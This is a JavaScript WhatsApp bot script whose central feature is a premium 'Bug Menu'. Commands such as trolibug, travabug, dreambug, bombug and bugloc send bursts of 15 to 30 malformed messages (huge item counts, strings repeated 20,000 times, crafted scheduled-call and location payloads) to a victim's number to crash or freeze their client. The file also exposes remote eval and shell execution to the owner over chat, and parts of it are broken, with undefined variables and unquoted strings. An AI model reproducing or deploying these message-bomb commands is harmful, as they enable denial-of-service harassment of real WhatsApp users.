process.on('uncaughtException', console.error)

const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@ferdiz-afk/baileys')

const fs = require('fs')
const util = require('util')
const path = require('path');
const axios = require('axios')
const toMs = require('ms')
const moment = require("moment-timezone");

const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    smsg,
    sleep,
    fetchJson,
    getBuffer,
    clockString,
    getGroupAdmins,
    formatCountdown,
    expiredPremiumCheck
} = require('./fungsi.js')
const msgFilter = require('./lib/msgFilter')

let Ownering = ['6285849261085', '6285768858825']

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
database: {}, 
users: {},
...(global.db.data || {})
}

module.exports = gatot = async (gatot, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '!'
        const isCmd = body.startsWith(prefix)
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const gtot = (m.quoted || m)
        const quoted = (gtot.mtype == 'buttonsMessage') ? gtot[Object.keys(gtot)[1]] : (gtot.mtype == 'templateMessage') ? gtot.hydratedTemplate[Object.keys(gtot.hydratedTemplate)[1]] : (gtot.mtype == 'product') ? gtot[Object.keys(gtot)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const pushname = m.pushName || "No Name"
        const isMedia = /image|video|sticker|audio/.test(mime)

        const isOwner = isCreator = Ownering.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        
        const mess = {
                 limit: "> ⓘ *_Your limit has reached the maximum_*",
                 premium: "> ⓘ *_Your not premium, buy premium for use this feature_*",
                 wait: "> ⓘ _Please wait a second_",
                 retry: "> ⓘ _Please try again later_"
        }

        //** 
        const qbug = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: ` pois0n - Bot `
}
}
}
//** Group
        const groupMetadata = m.isGroup ? await gatot.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
       // const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        
        const checkPremiumUser = (userId, _dir) => {
            let status = false;
            Object.keys(_dir).forEach((key) => {
                if (key === userId && _dir[key].premium === true) {
                    status = true;
                }
            });
            return status;
        };

        const isPremium = checkPremiumUser(m.sender, db.data.users) // mengecek user 
        let limitUser = isPremium ? 100 : 10 // penentuan limit bagi pengguna 

        function isLimit(userId, isOwner, limited) {
            if (isOwner) return false; // Jika dia owner, tidak ada batasan
            if (!global.db.data.users.hasOwnProperty(userId)) return true; // Jika user tidak ada, diasumsikan terkena batasan 
            const user = global.db.data.users[userId];
            return user.limit >= limited; // Mengembalikan true jika user telah mencapai batasan
        }

        const limitAdd = (sender) => {
            if (isOwner) return
            var a = global.db.data.users[sender]
            a.limit += 1
        }

        expiredPremiumCheck(gatot, global.db.data)
        
        //cost tambahan////
        const { troli1 } = require('./src/troli1.js')
                //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)   
            let user = global.db.data.users[m.sender]
            let limitUser = isPremium ? 30 : 5
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.cmdCountdown)) user.cmdCountdown = 0   
                if (!isPremium) user.premium = false                
                if (!isNumber(user.limit)) user.limit = limitUser
                if (!isNumber(user.expired)) user.expired = 0
            } else global.db.data.users[m.sender] = {               
               cmdCountdown: 0,
               premium: isPremium ? true : false,
               limit: 0,               
               expired: 0
            }            
        } catch (err) {
            console.log(err)
        }
                

        //** fake reply        
        const fake = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast" //status@broadcast
                } : {})
            },
            message: {
                "extendedTextMessage": {
                    "text": `Hallo ${pushname} 👋\n╰≻ ${prefix + command}`,
                    "title": `Hmm`,
                    'jpegThumbnail': fs.readFileSync('./lib/jhn.jpg')
                }
            }
        }
        

        // console logs pc   
        const reset = "\x1b[0m";
        const paint = {
            green: (text) => "\x1b[1;32m" + text + reset,
            red: (text) => "\x1b[1;31m" + text + reset,
            cyan: (text) => "\x1b[1;36m" + text + reset,
            yellow: (text) => "\x1b[1;33m" + text + reset,
        };
        if (isCmd) {
           console.log(
             paint.yellow(`| ${pushname} `),
             paint.green('use :'),
             paint.red(command),     
           );
        }
        //anti spam
        if (isCmd && msgFilter.isFiltered(m.chat) && !m.isGroup) {
            return m.reply('「 ❗ 」 _Spam Detected 5 Second/Command_')
        }
        if (isCmd && !isCreator) msgFilter.addFilter(m.chat)

        switch (command) {
        
            case 'menu':
            case 'tes': {
                let send = {
                    text: 'Hallo, Joxi here!' + `\n\n> _$ for eval_\n> _=> for eval_
ꪶ𖣂ꫂ  𝙹𝙷𝙾𝙽ᭂᭃ𝚂𝚃𝙰𝚁 ⿻  ༑   〽️

⼥🌈𝐙𝚈𝑱
.
⼳ ⛩️𝐙𝚈𝑱
.
⧉ _*Bug Menu Only Premium*_
⧉ _travabug_ 999xxx
⧉ _bombug_ 999xxx
⧉ _dreambug_ 999xxx
⧉ _bugaudio_ 999xxx
⧉ _trolibug_ 999xxx
⧉ _bugloc_ 999xxx

ꪶ𖣂ꫂ  𝑱𝜭𝜒𝜤𝜝𝜭  𑜦⃟᪾⿻

⧉ _*Downloader Menu*_
⧉ _tiktok_ enter url

ꪶ𖣂ꫂ 

⧉ _*Owner Menu*_
⧉ _addlimit_
⧉ _addpremium_
⧉ _listpremium_
by: mas y && mas P`,
                    contextInfo: {
                        externalAdReply: {
                            title: 'Official JoxiBo-Dark',
                            body: `This bot was created by Jhonwuu`,
                            thumbnail: fs.readFileSync('./lib/jhn.jpg'),
                            mediaUrl: "https://youtube.com",
                            renderLargerThumbnail: true,
                            showAdAttribution: false,
                            mediaType: 1
                        }
                    }
                }
                gatot.sendMessage(m.chat, send, {
                    quoted: fake
                })

            }
            break
           ////thumbTroli//
            const jhn2 = fs.readFileSync(`./lib/jhn2.jpg`)
            ////Thumbnail///
            case 'trolibug': {
if (!isPremium) return m.reply(mess.premium)
                if (isLimit(m.sender, isOwner, limitUser)) return m.reply(mess.limit)
                if (!text) return m.reply('Entry number, example: ' + prefix + command + ' 99900999')
                const { troli1 } = require('./src/troli1.js')
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": Fjhon,
"itemCount": 900000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${troli1}`,
"orderTitle": `${troli1}`, 
"sellerJid": "0@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m})
gatot.relayMessage(victim, order.message, { messageId: order.key.id })
}
m.reply(`*Successfully sent Bug Please pause for 3 minutes*`)
}
break
case 'bugaudio': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
const jhn = fs.readFileSync(`./music/jhn.mp3`)
jumlah = q * 2
for (let i = 0; i < jumlah; i++) {
await gatot.relayMessage(m.chat, { "caption": `𝙹𝙷𝙾𝙽ᭂᭃ𝚂𝚃𝙰𝚁`, audio: jhn, mimetype: 'audio/mpeg', ptt:false,"title":`𝙹𝙷𝙾𝙽ᭂᭃ𝚂𝚃𝙰𝚁`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(20000),serverMessageId: 2 }}},{quoted: qbug })
}
}
break
case 'bugloc': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6285768858825`)
target = q + '@s.whatsapp.net'
anjayyy = '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(20000)
for (let i = 0; i < 30; i++) {
joestar.sendMessage(target, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: ꪶ𖣂ꫂ  𝑱𝜭𝜒𝜤𝜝𝜭  𑜦⃟᪾⿻, address: ꪶ𖣂ꫂ  𝙹𝙷𝙾𝙽ᭂᭃ𝚂𝚃𝙰𝚁 ⿻  ༑   〽️, url: `https://${anjayyy}.com`, comment: 'ꪶ𖣂ꫂ  𝑱𝜭𝜒𝜤𝜝𝜭  𑜦⃟᪾⿻', jpegThumbnail: null } }, { quoted: qbug });
}
msgreply(`👤 Succes Send Bug ${command}. Jangan Lupa Jeda 5 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break
            case 'tiktok':
            case 'tt': {
                if (!text) return m.reply('> ⓘ _Please enter url tiktok video._')
                m.reply(mess.wait)
                var { data } = await axios.get('https://api.tiklydown.eu.org/api/download?url=' + text)
                var txt = '`Tiktok Downloader`\n\n'
                txt += '> _title: ' + data.title + '_\n'
                txt += '> _upload: ' + data.created_at + '_\n'
                txt += '> _liked: ' + data.stats.likeCount + '_\n'
                txt += '> _shared: ' + data.stats.shareCount + '_\n'
                txt += '> _played: ' + data.stats.playCount + '_\n'
                txt += '> _music title: ' + data.music.title + '_\n'
                txt += '> _music author: ' + data.music.author + '_\n'
                txt += '> _music url: ' + data.music.play_url + '_'
                await gatot.sendMessage(m.chat, { video: { url: data.video.noWatermark }, caption: txt }, { quoted: m })
            }
            break

           /* case 'tess': {
                var data_ = global.db.data.users[m.sender]
                var time_ = 180000 // 3 minutes
                var __timers = (new Date - data_.cmdCountdown)
                var _timers = (time_ - __timers)
                var timers = clockString(_timers)
                if (new Date - data_.cmdCountdown > time_) {
                    m.reply('Cmd sukses')
                    data_.cmdCountdown = new Date * 1
                } else {
                    m.reply(`> ⓘ _Please wait for 3 minutes before command again! countdown command ${timers}._`)
                }
            }
            break*/
            
            case 'bombug': {                
                if (!isPremium) return m.reply(mess.premium)
                if (isLimit(m.sender, isOwner, limitUser)) return m.reply(mess.limit)
                if (!text) return m.reply('Entry number, example: ' + prefix + command + ' 99900999')
                let num = `+` + text.split("|")[0].replace(/[^0-9]/g, '')
                let cekOn = await gatot.onWhatsApp(num)
                amount = "30"
                for (let i = 0; i < amount; i++) {
                const { trava } = require('./src/trava')
                if (cekOn.length == 0) return m.reply(`Enter a valid and registered number on WhatsApp!!!`)
                await gatot.sendMessage(`${text}@s.whatsapp.net`, {
                    text: "Hallo kami dari..."
                }, {
                    quoted: { 
                        key: {
                            remoteJid: 'status@broadcast',
                            fromMe: false,
                            participant: '0@s.whatsapp.net'
                        },
                        message: {
                            listResponseMessage: {
                                title: trava
                            }
                        }
                    }
                });                       
                await sleep(5000)
                }  
              limitAdd(m.sender)            
              m.reply(`> ⓘ _Please wait for 3 minutes before command again!._\n\n"status": 200\n"message": "succces send bug"`)
            }
            break

            case 'travabug': {
                if (!isPremium) return m.reply(mess.premium)
                if (isLimit(m.sender, isOwner, limitUser)) return m.reply(mess.limit)
                if (!text) return m.reply('Enter number, example: ' + prefix + command + ' 999000999')
                victim = text.split("|")[0] + '@s.whatsapp.net'
                amount = "30"
                for (let i = 0; i < amount; i++) {
                    const { trava } = require('./src/trava')
                    var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                        "scheduledCallCreationMessage": {
                            "callType": "2",
                            "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
                            "title": trava,
                        }
                    }), {
                        userJid: m.chat,
                        quoted: m
                    })
                    gatot.relayMessage(victim, scheduledCallCreationMessage.message, {
                        messageId: scheduledCallCreationMessage.key.id
                    })
                    await sleep(5000)
                }
            }
            m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
            limitAdd(m.sender)
            break
            

            case 'dreambug': {
                if (!isPremium) return m.reply(mess.premium)
                if (isLimit(m.sender, isOwner, limitUser)) return m.reply(mess.limit)
                if (!text) return m.reply('Enter number, example: ' + prefix + command + ' 999000999')
                victim = text.split("|")[0] + '@s.whatsapp.net'
                amount = "30"
                for (let i = 0; i < amount; i++) {
                    const { dream } = require('./src/dream')
                    var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                        "scheduledCallCreationMessage": {
                            "callType": "2",
                            "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
                            "title": dream,
                        }
                    }), {
                        userJid: m.chat,
                        quoted: m
                    })
                    gatot.relayMessage(victim, scheduledCallCreationMessage.message, {
                        messageId: scheduledCallCreationMessage.key.id
                    })
                    await sleep(5000)
                }
            }
            m.reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
            limitAdd(m.sender)
            break
            
            case 'addprem':
            case 'addpremium': {
               if (!isCreator) return m.reply('Are you have access?')
               if (!text) return m.reply('Enter number & Time, example: ' + prefix + command + ' 999000999|7D')
               victim = text.split("|")[0] + '@s.whatsapp.net'
               var [ number, timer ] = text.split("|")
               const cekUser = global.db.data.users[victim];
               if (cekUser) {                
                cekUser.premium = true
                cekUser.expired = Date.now() + toMs(timer);
                m.reply("Success add premium user")
               } else {
                return m.reply("User not found in database");  
               }               
            }
            break
            
            
            case 'addlimit': {
              if (!isCreator) return m.reply('Apakah Anda memiliki akses?');
              if (!text) return m.reply('Masukkan nomor & jumlah limit, contoh: ' + prefix + command + ' 687378|22');
              var [num, amount] = text.split('|');
              var numero = text.split("|")[0] + '@s.whatsapp.net'
              var user = global.db.data.users[numero];
              if (!user) return m.reply('Pengguna tidak ditemukan');
              var limUser = user.limit;
              var newLimit = limUser - parseInt(amount);
              if (newLimit < 0) { 
                 newLimit = 0;
              }
              global.db.data.users[numero].limit = newLimit;
              m.reply(`Limit untuk ${numero} diperbarui menjadi ${newLimit}`);
            }
            break;
case 'listprem':
case 'listpremium':
case 'getpremiumusers': {
    if (!isCreator) return m.reply('Apakah Anda memiliki akses?');
    
    // Panggil fungsi untuk mendapatkan semua data pengguna premium
    var premiumUsers = [];
    
    // Iterasi melalui objek pengguna dalam database
    for (var key in global.db.data.users) {
        // Periksa apakah status premium pengguna adalah true
        if (global.db.data.users[key].premium === true) {
            // Hitung mundur waktu premium habis (expired)
            var currentTime = Date.now();
            var expiredTime = global.db.data.users[key].expired;
            var countdown = expiredTime - currentTime;
            
            // Jika countdown negatif, atur menjadi 0
            countdown = Math.max(0, countdown);
            
            // Jika ya, tambahkan pengguna ke dalam array premiumUsers
            premiumUsers.push({
                userId: key,
                data: global.db.data.users[key],
                countdown: countdown
            });
        }
    }
               
    // Kirim pesan dengan daftar pengguna premium
    var message = "Daftar pengguna premium:\n";
    premiumUsers.forEach(user => {
        message += `User ID: ${user.userId}\n`;
        message += `Waktu premium habis: ${formatCountdown(user.countdown)}\n\n`;
        // Tambahkan info tambahan sesuai kebutuhan, misalnya nama, email, dll.
    });
    m.reply(message);
}
break

            default:

                if (body.startsWith('=>')) {
                    if (!isCreator) return

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return gatot.sendText(m.chat, bang, m)
                    }
                    try {
                        gatot.sendText(m.chat, util.format(eval(`(async () => { return ${body.slice(3)} })()`)), m)
                    } catch (e) {
                        gatot.sendText(m.chat, String(e), m)
                    }
                }

                if (body.startsWith('x')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(body.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await gatot.sendText(m.chat, util.format(evaled), m)
                    } catch (err) {
                        await gatot.sendText(m.chat, String(err), m)
                        console.log(err)
                    }
                }

                if (body.startsWith('$')) {
                    if (!isCreator) return
                    exec(body.slice(2), (err, stdout) => {
                        if (err) return gatot.sendText(m.chat, `${err}`, m)
                        if (stdout) return gatot.sendText(m.chat, stdout, m)
                    })
                }
        }
    } catch (err) {
        gatot.sendText(m.chat, util.format(err), m)
        console.log(err)
    }


    let file = require.resolve(__filename)
    fs.watchFile(file, () => {
        fs.unwatchFile(file)
        console.log(`Update ${__filename}`)
        delete require.cache[file]
        require(file)
    })
}